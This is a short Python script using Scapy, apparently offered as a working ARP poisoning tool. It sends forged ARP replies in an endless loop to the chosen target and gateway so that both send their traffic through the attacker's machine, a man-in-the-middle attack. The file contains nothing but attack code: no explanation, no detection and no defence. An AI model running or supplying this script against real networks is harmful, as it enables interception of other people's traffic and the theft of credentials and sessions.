from scapy.all import *
import subprocess
import time
target_ip = "" # Input target IP address
gateway_ip = "" # Input gateway IP address

ifconfigResult = subprocess.check_output("ifconfig eth0", shell=True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen", ifconfigResult).group(1).strip()

eth = Ether(src=attacker_mac)
h_arp = ARP(hwsrc=attacker_mac, psrc=gateway_ip, pdst=target_ip)
g_arp = ARP(hwsrc=attacker_mac, psrc=target_ip, pdst=gateway_ip)

print("[ATTENTION!] ARP Poising attack has been started!")
print("Hit CTRL+C to stop this attack.")
while True:
	try:
		sendp(eth/h_arp, verbose=False)
		sendp(eth/g_arp, verbose=False)
	except KeyboardInterrupt:
		print("Stopped ARP Poising.")
		break
	#time.sleep(1)